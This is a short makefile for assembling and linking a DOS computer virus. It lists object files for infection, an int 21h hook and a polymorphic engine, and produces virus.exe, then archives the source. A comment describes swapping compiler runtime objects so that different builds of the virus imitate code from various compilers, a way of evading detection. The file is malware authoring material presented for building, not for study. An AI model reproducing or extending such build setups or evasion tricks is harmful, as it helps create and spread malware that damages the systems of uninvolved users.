.autodepend
#
# HLL Compiler Code. Change this, to create different
# versions of the virus to look like code from various
# compilers.
#
WRAPPER_OBJ 	= .\Sylvia_P\c0t.obj
CODE_LIBRARY	= .\Sylvia_P\cs.lib

# 
# Virus Object Files and such.
#
VIRUS_OBJS	= main.obj int21h.obj infect.obj poly.obj vdata.obj


#
# Generic Dependencies
#
.asm.obj:
  $(AS) $<
	
#
# Assembler Config
#
AS 		= tasm $(ASM_params)
ASM_params 	= /m9 /mx /n /t

#
# Linker Config
#
LD 		= tlink $(LD_params)
LD_params	= /c /d /m /s /n

#
# The Making
#
virus.exe: $(VIRUS_OBJS)
	   $(LD) $(WRAPPER_OBJ) $(VIRUS_OBJS), virus.exe, virus.map, $(CODE_LIBRARY)
	   #del d:\csv.rar
	   rar u -r -u -std d:\csv.rar *.as? *.inc makefile virus.exe readme.1st c0t.obj cs.lib